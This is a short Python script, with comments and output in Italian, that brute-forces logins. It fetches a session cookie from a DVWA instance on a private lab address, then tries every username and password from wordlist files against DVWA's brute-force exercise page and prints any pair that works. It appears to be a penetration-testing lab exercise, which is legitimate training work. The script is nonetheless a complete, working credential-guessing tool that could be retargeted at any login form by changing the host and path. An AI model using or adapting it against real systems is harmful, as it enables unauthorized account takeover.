import http.client, urllib.parse

lista_username = open("usernames.lst")
lista_password = open("passwords.lst")

user = lista_username.readlines() 
password = lista_password.readlines()

post_parameters = urllib.parse.urlencode({'username': 'admin', 'password': 'password', 'Login':"Login"})
headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
conn = http.client.HTTPConnection("192.168.50.101")
conn.request("POST", "/dvwa/login.php", post_parameters, headers)
response = conn.getresponse()
response.read().decode()
set_cookie_header = response.getheaders()
dest_cookie = []
for cookie in set_cookie_header:
    if cookie[0] == 'Set-Cookie':
        dest_cookie.append(cookie[1].split(";")[0])
conn.close()
#print(dest_cookie[0])

for usr in user:      
    usr = usr.rstrip()
    for pwd in password:

        pwd = pwd.rstrip()

        #print(usr, "-",pwd)

        conn = http.client.HTTPConnection("192.168.50.101",80)
        post_parameters = urllib.parse.urlencode({'username': usr, 'password': pwd, 'Login':'Login#'}) 
        url_dvwa_bf = '/dvwa/vulnerabilities/brute/'
        url_target = url_dvwa_bf + '?' + post_parameters

        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':dest_cookie[0]}  
        conn.request("GET", url_target, post_parameters, headers) 
        response = conn.getresponse()
        page_content = response.read().decode()
        if "Username and/or password incorrect" in str(page_content):
            continue
        else:
            print(f"Accesso effettuato con username: '{usr}' - password: '{pwd}'")
        conn.close()
